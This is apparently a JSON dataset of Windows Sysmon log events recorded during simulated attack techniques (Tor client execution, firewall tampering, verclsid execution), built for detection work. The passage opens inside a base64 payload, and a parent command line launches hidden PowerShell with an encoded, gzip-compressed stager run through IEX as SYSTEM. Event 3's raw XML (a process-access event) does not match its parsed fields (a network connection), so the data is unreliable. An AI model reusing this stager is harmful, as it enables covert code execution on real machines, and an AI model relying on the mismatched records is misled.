RgBXAGUAMwBxADIALwBGADUAYgBxAFAAaABjAGkAagBRAFEAaAAxAFQAdgBMAEkAcAB0AGkAbgBUAGgANQBWAEEAKwBFAGQAagBxAHEAaABaAE0AbABTACsAOQBQAGQAWAB1AGgATABqADIAQQBoAE0AMwBOAFQANAB4AFYASQBEADEAZgBYAFcAUQBBAFYARQB4AEwASQBMAHMAQQB3AHMAagBlAFUAZQBOAGgAWABxAE8AUgBSADIAMwBOAG8ATABiAGEAOQBSAGUAYQBDADkAaQBvAG0AZABlAHoANwBVAEgASgBnAEsAWQBLAGMAdwBJADcAQwB3AHAAYQBLAE0AOQB6AEoALwA1AFUAZgBSAHQARwBtADAAbABwAHYAZgBMAG8ARwA2AGEAUQBMAE4AWAAyADgAZwBKADUAegBxAEsAaQBFAGIAbgBoAEIASABlADEAdgAzAE0ANwBxAEoAQwAwAEsAaABWAFUARwAwAG8AbgBUAFEAQQBEAGIAWgB6AEsAUABIAGoAMAB1AG8AYQA5AHAAKwBaACsASQA5ACsALwBjACsANwBIAEYALwBPAEIAbQBuAGQATgBEAEkAdgBXAGsARQBDAGUAMQBXAEsAcAB5AFMAUwBTAEoARwBpADYAMwBSAHkAdwBUADUATABnAEUAMQBKAHEAYwByAFcAdABZADAATwBzAHIATwAyAGwAagB1AGwAYQArAEMAYgBkAFcAMwBGAHMATgByADMAbgBMAGoASgByAHQAYgBkAHMAYwB3AFMAKwBDAFgAMwBuAGIATgBMAHYAZAB6AHYAMgBtAGQAdAA4AGwAWgBuAGcAMwBhAEoAYwA2AHIAagBXADgAYQBWAHkARgB1ADkAQQBLAFIANwBWAFMAdQBWAGsAQwB1AFoAZAB0AHkAMwBTAHQANgBJADUAOQB1AFEAagBYAFYAeABmAE8AeABvAHIANgBzAEMAYwArAGIAdAB1AGkAWQBVAFcATgBhAHYAdAB5AHkANQByAFgAQwA2ADkAeQBzAEoAUABxAEQAKwBlADcAaQAvAG4AWQBhAG4ANgBjAHQANQBwAFgANwBVAGYAUgBWAFAASgB0AEsANgBvADEAdAAvAFUASwBnAC8AVgA3AEsANgBxAHoARAB1AGoAZABYAEcAKwBDADIAcwA2ADUAbwBtAGIAbgBtAG8ANgA3AFoARgBlAFcATgB4AFEAdgA5AHYASAAvAEgAdAArAFoAWQBiAC8AegBwAFMAUgBXAFAAWQBqAEIAcgByAHkAUQBUAHIAMwBmAHMAVQByAHkANAA3AEwAYwBhAEoAVQBIAFgAMQA5AGkASgBsAFoAVwAzAFAAOQBnAGgAcAB1AFkAUABJAHYAVgBjADAAeABXAGQAbgB3ADMANgBzAFEAZwA5AC8AegBzADIAMwBaAHQAYgAxADkAKwBIAGIAMABmAHUASwBRAFMAMwBMAEgAKwB6AHUAbABZADUAVwBhADMAWAB0AHIAVABuAGYATgB5AHUAUQBuADcANAA5AEgARAA4ADgAcQAyAFEAZgA2AGEATgA5AG4AZABRADcAQQBWAHIAYwBXAFYASABiAEwAeABqAGsAUwB3AGYAMgBIAGIAegB0ADYAQgB3AEsASgB4AC8ASwBVADgAdwBNAHoAWgBrAFoAZABrAFAAKwA0ADEANABPADcAVABNADgAQwBIAGwATABlAHQAbQB6AGIARQBGAGQAVABpAEwAdAA5ADYAQgBEAEEAbgA3AFYANwBjAFgAYwBZAEQATwA3AEgAcABtAE4ASABxADAAdgAzAG8AZwB2ADgAbAArADkAMwBUAHgAYQBiAGQASgBwAFUAdAB5AEYAOAB2AG8AMQBvAHMAOABKAFYAUABuAHUAMwBLADMAZABOAGkAUABDAFkAVgB1AFcALwBYAFgAZwBaAGQAMABuADgAaAA1AFgAYgBsAGYAVwBOAGMARwBkAGwAKwB2ACsAVwBXAFAAdgBUAHMAaAAxADIALwB1AFgAeQBZAHQAMwBhAGwAdQBiAG4ALwBjAHQAKwA0AHIAegA0ADEAYQAyAEoAawAzAGcAKwBIAFoAcwAzAEUAWgBtADAANABhAHUANgBIAHcAMgBHAE4AcgBZAGkAMwBKAGEAUABGADcAYQAxAGkAbgBjAHMANAB6AEoARwA5ADYAcwAyAC8ASQBmAGgAZgA4AEMAVQA2ADgAZwByAFkAQgBFAFIAVgArACsALwBlAEcAYQBxAC8ASAAwADgAbQA1AC8AdABwAE4AbwArAFAAMwA0AFgANQBIAHEAeQBWAFAAeQBpAE8ASgBpAGMAUgBQAG0ASABtAFcAMABPAHUAaAA3AGwAWQBZAGgAOABZAEMANABNAHEAYQB6AE4ATgB4AHAAdQBIAGMAVABOAGcAbgB0AEwAUQA5AGQAZABmAFMATQArAFUAQgA5AFMASAAxAHcATwA4AEwANwBMAGkAcgBQAG8AKwBJADIAcABBAHYAagBHAHAAWQBGAHkAbgBRADMAUQBLAFQAZQBnAEIAbAB1AFgATABWADEAYwBHAE8AZwByAEMAVgBFAHgAagBtAG8AZQB1AG0AdwB5AFIAUQA0AFQAWgBMAE0AMABFAFAAMwAzADYAQwB1AEgAbABUADAARABzADAAbQBBAGgAbAAzAGwAVQAyAHAAZABMAHAAWgBMADYAZgAxAFUAeQBjAHIAOABPAFMANQAxAHQAWQB2ADEAbwBMAHEAKwBHADYASQBrAG4AcAB6AGYANQB5AFUAMwBHAEEAWAAwAGUAQgBtAHYANgBIAHkAYgBnAGgAMAB2AC8ARwBWAG8ARgBYAGoASwBIAGoAOQBBAGwARAByADIATwBsADUASABUAFAAdQBkAHkAbABvAHQATwA5AG8AWAAzAEEAcQA5AE0AdQBrAFUAMwBDAGYAZQBFAHgARgB3AFcAVgBtAHcATwBUADkASwBrAHgAKwByAG4AMgBFAEMAVwBPAFUAYgBuAEcASAAxAEgAQgBRAGkAdgBLAHMAcQBYADgAQwA3AGwAaQAxAEEAMQBYAEoAUQArAHMANwArAGgASABmAFoAUwB4AFcALwBvAG4AaABJAEsAegA2AFIAQwBoADgAMgBCAHAAUgBUAG0AcABqAEsAZABHAEYASABDAHMAUABkAC8AMgAvAHkAMABvADcAYwBMAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=",
          "CurrentDirectory": "C:\\Windows\\system32\\",
          "User": "NT AUTHORITY\\SYSTEM",
          "LogonGuid": "{64AF4F22-4083-6035-E703-000000000000}",
          "LogonId": "0x3e7",
          "TerminalSessionId": "0",
          "IntegrityLevel": "System",
          "Hashes": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
          "ParentProcessGuid": "{64AF4F22-7A22-6035-3410-00000000AD01}",
          "ParentProcessId": "6832",
          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
          "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADMAUABhAE8AQgBQACsASABQADQASwBmAGMAaQBNADcAUwBsAFEARQB0AEkAMAA5AEMAWQB6ADUAWQBjAEIAOAB3AEsAQgBtAEMAUwAwAEgATQBNAEkAVwBRAFkAVABZADQARQBrAEcANQB4AHIALwAvAGQAMwBaAFcATwBPAFgAcABPADcAegB0AHgAbABoAG8AawBzADcAYQA1ADIAbgAzADEAMgBWAHoAYQBWAEIAVgB0AHkAagA4AGcAZQBjAHkAZwBxAFAARgBJAHUAUABCAGEAZwB5ADEAegB1AHYATQBFAHMAaQBXADcAUgBaAHkAMwBuAGgAZwBHAFIAYQBsAHMAdABaAGcAcwBxAFoAeAB2AE8AeQBBAHcANwBEAHEAZABDAG8ARAA5AHkAWgB3AFAATQA4AFIAcgBwADUAeABIAG0AcwB6AFYAegBRAHAALwBtAFUAZgBLAGgAQgBLAGsAVABjAG0AcQBjAG4AZQBYAE8AawBxADAAdwBFAE4AaQBsAHMAdwBCAEwATAA2AEsAegBOAFoAVgBMADUAZwBpADQAUwBKADkAVQBOADUAcwBHAFcAMgBNAHYAbQBIADcANgBWAEEAOAA1AHAANABGAE0AdgA0AHMAdABLAHEAdABDADAAUABYAGMAOQA2AGoAUQBEAGYAUQBOAFAAUwAwAHAAcAA0AFcANwArAFkAbwBTAGkAZgA1AEEANQA3AE4AaQB5ADIAZAB6ADcAQgAvAEUANABqAG8AbQBTAHcAaQBvAEcAagBqAHEAcgBNAHMASQBWAGgARQBVADcAWQAzAHYAUwBWADMANwAvAFgAZgBOAG0AQgBRAHUAcABrAFYAegBHADIASgBmADYASgBvAGQAQwAwAG4AWABSAGMAZgAzAE4AUQBOADkATgA5AFMARgBvADMAaABEAGQAYQAzAG4ARQBjADQARQBjADIAWAB4AHkAUQB2AEsAbAA4AFcASAB4AFAAdAArADQAbgB3AHYAOQBWADAAegBEAHAARQB0AE4AaABqAGkAZQBEAHQASQBaAFQAWABWADAAVABWAFkARABnAEMAYgBhAG8AcQBoAGwAawBjAFQAZABkADkAawBPAGsAVwBmAGoAOQA3AGMAaAA0AEgAMAAxAHIAUgBvAEIAWgBKAHkAdAByAEUAcABqAHoAeABDAFIAYgBHAE4AQQA4AGUAbgA5ADkAUQBGAE4AVQAxAEEAKwBvAEsARgBaAG8AQQBUAG4ATQBxAFEAQgB5AGoAegBCAGYAUQBpADkAawB6ADEAOAB5AEQAMAAvAFQAegBZAG4AZgB5AHEAMwBhAG4AZQBwADcAcwBNADMARgA5AFYAMABrACsAVgBRAEcAbwBnAHUAWgBFAC8AYwBPAEoAWAA0AE8AZwBsAHYARQBuAE4AUQBUAGcALwBlAFgAOQBDAEwAZwBQACsAZgBpAEsAWQBrAGYAdQBlAGUANABXAHEARAB2AFgAcABBAGsAcwA2AGsANABEAHYAQwBWAGQAegBaADIAZQBUAFoARQBrAGgASABuADMAQQBoAEoAZgBvADMAYQBKAFMASAB2AFgAQQBDAFMAdwBaAGoAMQBVADYAUgB6AHkAawB4AHYAVABQAC8ASwBUAFgAWgBwAG8AaQAvADYAYQBoAGkAMAB6AHIAbwBKAE8AbQBKAC8AWABqAEYAawAwAGUAbQBlAGQATQBjADIAZABHADcAcwBBAGUAdABUACsAYgBoADUANwB2AFUASwA3AE8AMwA2ADYARwBCAG4AVwA5AGcARABiAGkAQQBLADgAOQBrAGgARgBlAGYAeQAxAG4AMQBQAFYAcABnAGsAYwB4AEUAKwB1AEQAbgA3AHAAMgBPAEsAQgBPADQANABDAE8AcABnAEMAZAAvAEsAeABtAHIAagAxADUAMQBLADIAbAB6AGwAVQBKADUARgAyAEEAVgAwAEEASgA0ADAAZABuADAAaAB6AHEAbQBoAFgAMAA2AEIAcgB3AFMANwArAEIAcAB1AGMAdQBsAEIAbgBOAHAAQQArAGwARgBXAGUAMwBxADIALwBGADUAYgBxAFAAaABjAGkAagBRAFEAaAAxAFQAdgBMAEkAcAB0AGkAbgBUAGgANQBWAEEAKwBFAGQAagBxAHEAaABaAE0AbABTACsAOQBQAGQAWAB1AGgATABqADIAQQBoAE0AMwBOAFQANAB4AFYASQBEADEAZgBYAFcAUQBBAFYARQB4AEwASQBMAHMAQQB3AHMAagBlAFUAZQBOAGgAWABxAE8AUgBSADIAMwBOAG8ATABiAGEAOQBSAGUAYQBDADkAaQBvAG0AZABlAHoANwBVAEgASgBnAEsAWQBLAGMAdwBJADcAQwB3AHAAYQBLAE0AOQB6AEoALwA1AFUAZgBSAHQARwBtADAAbABwAHYAZgBMAG8ARwA2AGEAUQBMAE4AWAAyADgAZwBKADUAegBxAEsAaQBFAGIAbgBoAEIASABlADEAdgAzAE0ANwBxAEoAQwAwAEsAaABWAFUARwAwAG8AbgBUAFEAQQBEAGIAWgB6AEsAUABIAGoAMAB1AG8AYQA5AHAAKwBaACsASQA5ACsALwBjACsANwBIAEYALwBPAEIAbQBuAGQATgBEAEkAdgBXAGsARQBDAGUAMQBXAEsAcAB5AFMAUwBTAEoARwBpADYAMwBSAHkAdwBUADUATABnAEUAMQBKAHEAYwByAFcAdABZADAATwBzAHIATwAyAGwAagB1AGwAYQArAEMAYgBkAFcAMwBGAHMATgByADMAbgBMAGoASgByAHQAYgBkAHMAYwB3AFMAKwBDAFgAMwBuAGIATgBMAHYAZAB6AHYAMgBtAGQAdAA4AGwAWgBuAGcAMwBhAEoAYwA2AHIAagBXADgAYQBWAHkARgB1ADkAQQBLAFIANwBWAFMAdQBWAGsAQwB1AFoAZAB0AHkAMwBTAHQANgBJADUAOQB1AFEAagBYAFYAeABmAE8AeABvAHIANgBzAEMAYwArAGIAdAB1AGkAWQBVAFcATgBhAHYAdAB5AHkANQByAFgAQwA2ADkAeQBzAEoAUABxAEQAKwBlADcAaQAvAG4AWQBhAG4ANgBjAHQANQBwAFgANwBVAGYAUgBWAFAASgB0AEsANgBvADEAdAAvAFUASwBnAC8AVgA3AEsANgBxAHoARAB1AGoAZABYAEcAKwBDADIAcwA2ADUAbwBtAGIAbgBtAG8ANgA3AFoARgBlAFcATgB4AFEAdgA5AHYASAAvAEgAdAArAFoAWQBiAC8AegBwAFMAUgBXAFAAWQBqAEIAcgByAHkAUQBUAHIAMwBmAHMAVQByAHkANAA3AEwAYwBhAEoAVQBIAFgAMQA5AGkASgBsAFoAVwAzAFAAOQBnAGgAcAB1AFkAUABJAHYAVgBjADAAeABXAGQAbgB3ADMANgBzAFEAZwA5AC8AegBzADIAMwBaAHQAYgAxADkAKwBIAGIAMABmAHUASwBRAFMAMwBMAEgAKwB6AHUAbABZADUAVwBhADMAWAB0AHIAVABuAGYATgB5AHUAUQBuADcANAA5AEgARAA4ADgAcQAyAFEAZgA2AGEATgA5AG4AZABRADcAQQBWAHIAYwBXAFYASABiAEwAeABqAGsAUwB3AGYAMgBIAGIAegB0ADYAQgB3AEsASgB4AC8ASwBVADgAdwBNAHoAWgBrAFoAZABrAFAAKwA0ADEANABPADcAVABNADgAQwBIAGwATABlAHQAbQB6AGIARQBGAGQAVABpAEwAdAA5ADYAQgBEAEEAbgA3AFYANwBjAFgAYwBZAEQATwA3AEgAcABtAE4ASABxADAAdgAzAG8AZwB2ADgAbAArADkAMwBUAHgAYQBiAGQASgBwAFUAdAB5AEYAOAB2AG8AMQBvAHMAOABKAFYAUABuAHUAMwBLADMAZABOAGkAUABDAFkAVgB1AFcALwBYAFgAZwBaAGQAMABuADgAaAA1AFgAYgBsAGYAVwBOAGMARwBkAGwAKwB2ACsAVwBXAFAAdgBUAHMAaAAxADIALwB1AFgAeQBZAHQAMwBhAGwAdQBiAG4ALwBjAHQAKwA0AHIAegA0ADEAYQAyAEoAawAzAGcAKwBIAFoAcwAzAEUAWgBtADAANABhAHUANgBIAHcAMgBHAE4AcgBZAGkAMwBKAGEAUABGADcAYQAxAGkAbgBjAHMANAB6AEoARwA5ADYAcwAyAC8ASQBmAGgAZgA4AEMAVQA2ADgAZwByAFkAQgBFAFIAVgArACsALwBlAEcAYQBxAC8ASAAwADgAbQA1AC8AdABwAE4AbwArAFAAMwA0AFgANQBIAHEAeQBWAFAAeQBpAE8ASgBpAGMAUgBQAG0ASABtAFcAMABPAHUAaAA3AGwAWQBZAGgAOABZAEMANABNAHEAYQB6AE4ATgB4AHAAdQBIAGMAVABOAGcAbgB0AEwAUQA5AGQAZABmAFMATQArAFUAQgA5AFMASAAxAHcATwA4AEwANwBMAGkAcgBQAG8AKwBJADIAcABBAHYAagBHAHAAWQBGAHkAbgBRADMAUQBLAFQAZQBnAEIAbAB1AFgATABWADEAYwBHAE8AZwByAEMAVgBFAHgAagBtAG8AZQB1AG0AdwB5AFIAUQA0AFQAWgBMAE0AMABFAFAAMwAzADYAQwB1AEgAbABUADAARABzADAAbQBBAGgAbAAzAGwAVQAyAHAAZABMAHAAWgBMADYAZgAxAFUAeQBjAHIAOABPAFMANQAxAHQAWQB2ADEAbwBMAHEAKwBHADYASQBrAG4AcAB6AGYANQB5AFUAMwBHAEEAWAAwAGUAQgBtAHYANgBIAHkAYgBnAGgAMAB2AC8ARwBWAG8ARgBYAGoASwBIAGoAOQBBAGwARAByADIATwBsADUASABUAFAAdQBkAHkAbABvAHQATwA5AG8AWAAzAEEAcQA5AE0AdQBrAFUAMwBDAGYAZQBFAHgARgB3AFcAVgBtAHcATwBUADkASwBrAHgAKwByAG4AMgBFAEMAVwBPAFUAYgBuAEcASAAxAEgAQgBRAGkAdgBLAHMAcQBYADgAQwA3AGwAaQAxAEEAMQBYAEoAUQArAHMANwArAGgASABmAFoAUwB4AFcALwBvAG4AaABJAEsAegA2AFIAQwBoADgAMgBCAHAAUgBUAG0AcABqAEsAZABHAEYASABDAHMAUABkAC8AMgAvAHkAMABvADcAYwBMAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA="
        }
      }
    },
    "2": {
      "event_id": "2",
      "length": 1231,
      "source_file": "datasets\\attack_techniques\\T1090.003\\windows_tor_client_execution\\windows-sysmon.log",
      "event_index_in_file": 673,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>2</EventID><Version>5</Version><Level>4</Level><Task>2</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-01-20T02:17:01.6562563Z'/><EventRecordID>183</EventRecordID><Correlation/><Execution ProcessID='9452' ThreadID='3804'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DESKTOP-39DIRD1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1099</Data><Data Name='UtcTime'>2026-01-20 02:17:01.653</Data><Data Name='ProcessGuid'>{09d8803c-e583-696e-bf04-000000000f00}</Data><Data Name='ProcessId'>3200</Data><Data Name='Image'>C:\\Users\\Admin\\Downloads\\tor-browser-windows-x86_64-portable-15.0.4.exe</Data><Data Name='TargetFilename'>C:\\Users\\Admin\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\extensions\\{73a6fe31-595d-460b-a920-fcc0f8843232}.xpi</Data><Data Name='CreationUtcTime'>2026-01-12 12:13:00.000</Data><Data Name='PreviousCreationUtcTime'>2026-01-20 02:17:01.538</Data><Data Name='User'>DESKTOP-39DIRD1\\Admin</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "2",
        "Timestamp": "2026-01-20T02:17:01.6562563Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "DESKTOP-39DIRD1",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
          },
          "EventID": "2",
          "Version": "5",
          "Level": "4",
          "Task": "2",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2026-01-20T02:17:01.6562563Z"
          },
          "EventRecordID": "183",
          "Correlation": "",
          "Execution": {
            "ProcessID": "9452",
            "ThreadID": "3804"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "DESKTOP-39DIRD1",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "T1099",
          "UtcTime": "2026-01-20 02:17:01.653",
          "ProcessGuid": "{09d8803c-e583-696e-bf04-000000000f00}",
          "ProcessId": "3200",
          "Image": "C:\\Users\\Admin\\Downloads\\tor-browser-windows-x86_64-portable-15.0.4.exe",
          "TargetFilename": "C:\\Users\\Admin\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\extensions\\{73a6fe31-595d-460b-a920-fcc0f8843232}.xpi",
          "CreationUtcTime": "2026-01-12 12:13:00.000",
          "PreviousCreationUtcTime": "2026-01-20 02:17:01.538",
          "User": "DESKTOP-39DIRD1\\Admin"
        }
      }
    },
    "3": {
      "event_id": "3",
      "length": 3822,
      "source_file": "datasets\\attack_techniques\\T1562.004\\atomic_red_team\\windows-sysmon.log",
      "event_index_in_file": 12203,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-23T13:01:11.024337400Z'/><EventRecordID>10584</EventRecordID><Correlation/><Execution ProcessID='3112' ThreadID='3620'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-169.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2020-11-23 13:01:11.019</Data><Data Name='SourceProcessGUID'>{84FDB31E-B296-5FBB-0000-0010338D1B00}</Data><Data Name='SourceProcessId'>3712</Data><Data Name='SourceThreadId'>3276</Data><Data Name='SourceImage'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='TargetProcessGUID'>{84FDB31E-B297-5FBB-0000-0010CBAE1B00}</Data><Data Name='TargetProcessId'>3372</Data><Data Name='TargetImage'>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\\Windows\\SYSTEM32\\ntdll.dll+a6d64|C:\\Windows\\System32\\KERNELBASE.dll+2b860|C:\\Windows\\System32\\KERNELBASE.dll+6b246|C:\\Windows\\System32\\KERNEL32.DLL+1c213|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+3332f6|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+270222|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+26fe9f|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+26f9ee|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+26f97a|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+26e48b|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+7c242b|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\7e90080f26800b0f94f23eecd5dbab97\\System.ni.dll+7c18d9|UNKNOWN(00007FF99C0A9DC0)|UNKNOWN(00007FF99C0A9DC0)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb81738e(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb7f3167(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb7f2e38(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+ec2a471d(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb7b39ce(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb811e9d(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb7f5502(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb7f5502(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb7f5502(wow64)|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\f2e75c3c5abfc2c2cdb9a82b4cd032d5\\System.Management.Automation.ni.dll+eb7f5502(wow64)</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "3",
        "Timestamp": "2020-11-23T13:01:12.753829800Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-dc-169.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "3",
          "Version": "5",
          "Level": "4",
          "Task": "3",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2020-11-23T13:01:12.753829800Z"
          },
          "EventRecordID": "10701",
          "Correlation": "",
          "Execution": {
            "ProcessID": "3112",
            "ThreadID": "3604"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-dc-169.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "",
          "UtcTime": "2020-11-23 13:01:10.830",
          "ProcessGuid": "{84FDB31E-B296-5FBB-0000-0010338D1B00}",
          "ProcessId": "3712",
          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "User": "ATTACKRANGE\\Administrator",
          "Protocol": "tcp",
          "Initiated": "true",
          "SourceIsIpv6": "false",
          "SourceIp": "10.0.1.14",
          "SourceHostname": "win-dc-169.attackrange.local",
          "SourcePort": "53585",
          "SourcePortName": "",
          "DestinationIsIpv6": "false",
          "DestinationIp": "23.203.68.14",
          "DestinationHostname": "a23-203-68-14.deploy.static.akamaitechnologies.com",
          "DestinationPort": "443",
          "DestinationPortName": "https"
        }
      }
    },
    "4": {
      "event_id": "4",
      "length": 778,
      "source_file": "datasets\\attack_techniques\\T1218.012\\verclsid_exec\\sysmon.log",
      "event_index_in_file": 39,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>4</EventID><Version>3</Version><Level>4</Level><Task>4</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-09-29T07:41:15.931539700Z'/><EventRecordID>1421139</EventRecordID><Correlation/><Execution ProcessID='1968' ThreadID='2728'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-542.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2021-09-29 07:41:15.922</Data><Data Name='State'>Started</Data><Data Name='Version'>13.01</Data><Data Name='SchemaVersion'>4.50</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "4",
        "Timestamp": "2021-09-29T07:41:15.931539700Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-host-542.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "4",
          "Version": "3",
          "Level": "4",
          "Task": "4",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2021-09-29T07:41:15.931539700Z"
          },
          "EventRecordID": "1421139",
          "Correlation": "",
          "Execution": {
            "ProcessID": "1968",
            "ThreadID": "2728"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-host-542.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
